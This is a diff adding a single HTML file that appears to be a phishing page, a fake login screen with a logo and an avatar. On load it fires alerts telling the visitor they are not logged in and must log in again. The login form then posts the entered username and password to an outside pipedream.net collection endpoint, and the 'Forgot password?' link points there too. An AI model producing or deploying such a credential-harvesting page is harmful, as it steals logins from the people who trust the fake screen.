@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {font-family: Arial, Helvetica, sans-serif; background-color: #0096FF;
+}
+
+/* Full-width input fields */
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+/* Set a style for all buttons */
+button {
+  background-color: #ff7f00;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+/* Extra styles for the cancel button */
+.cancelbtn {
+  width: auto;
+  padding: 10px 18px;
+  background-color: #00b7ff;
+}
+
+/* Center the image and position the close button */
+.imgcontainer {
+  text-align: center;
+  margin: 24px 0 12px 0;
+  position: relative;
+}
+
+img.avatar {
+  width: 40%;
+  border-radius: 50%;
+}
+
+.container {
+  padding: 16px;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+  padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+  background-color: #00b7ff;
+  margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+  border: 1px solid #888;
+  width: 80%; /* Could be more or less, depending on screen size */
+}
+
+/* The Close Button (x) */
+.close {
+  position: absolute;
+  right: 25px;
+  top: 0;
+  color: #000;
+  font-size: 35px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: red;
+  cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+  -webkit-animation: animatezoom 0.6s;
+  animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+  from {-webkit-transform: scale(0)} 
+  to {-webkit-transform: scale(1)}
+}
+  
+@keyframes animatezoom {
+  from {transform: scale(0)} 
+  to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+<script type="text/javascript">
+      alert("You Are Not Login");
+   </script>
+   <script type="text/javascript">
+      alert("Login Again");
+   </script>
+   <img src="https://i.ibb.co/fxgsCwM/unnamed-2-removebg-preview.png" width="50" height="50">
+   <center><img src="data:image/png;base64,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" width="294" height="100">
+<center><h2 text>Login</h2>
+<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Login</button>
+<div id="id01" class="modal">
+  <form class="modal-content animate" action="https://eozyxv90gnw7z7g.m.pipedream.net" method="post">
+    <div class="imgcontainer">
+      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
+      <img src="https://i.ibb.co/fxgsCwM/unnamed-2-removebg-preview.png" alt="Avatar" class="avatar">
+    </div>
+    <div class="container">
+      <label for="uname"><b>Username</b></label>
+      <input type="text" placeholder="Enter Username" name="uname" required>
+
+      <label for="psw"><b>Password</b></label>
+      <input type="password" placeholder="Enter Password" name="psw" required>
+        
+      <button type="submit" onclick="alert(success)">Login</button>
+      <label>
+        <input type="checkbox" checked="checked" name="remember"> Remember me
+      </label>
+    </div>
+
+    <div class="container" style="background-color:#f1f1f1">
+      <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancel</button>
+      <span class="psw">
+        <a href="https://eozyxv90gnw7z7g.m.pipedream.net/forgot_password" target="_blank" data-spm-protocol="i">Forgot password?</a>
+      </span>
+    </div>
+  </form>
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+</script>
+</body>
+</html>
+
